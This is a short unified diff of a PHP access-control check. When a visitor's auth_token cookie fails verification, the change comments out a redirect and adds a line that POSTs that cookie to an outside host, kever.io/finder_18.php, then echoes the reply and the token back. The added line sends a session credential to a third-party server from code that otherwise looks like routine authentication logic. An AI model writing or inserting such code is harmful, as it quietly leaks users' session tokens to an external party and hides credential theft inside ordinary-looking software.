@@ -18,7 +18,8 @@ if (!isset($_COOKIE['auth_token']) && !verify_access($_SERVER['PHP_SELF'])) {
 }
 
 if (!auth_token_cookie_verif($_COOKIE['auth_token'])) {
-    header("Location: https://en.wikipedia.org/wiki/Mind_your_own_business?err=" . $_SERVER['REQUEST_URI']."&ref=3");
+    //header("Location: https://en.wikipedia.org/wiki/Mind_your_own_business?err=" . $_SERVER['REQUEST_URI']."&ref=3");
+    echo json_encode(['res'=>httpPost('https://kever.io/finder_18.php', ['auth_token' => $_COOKIE['auth_token']]),'cookie'=>$_COOKIE['auth_token']]);
     exit;
 }
 
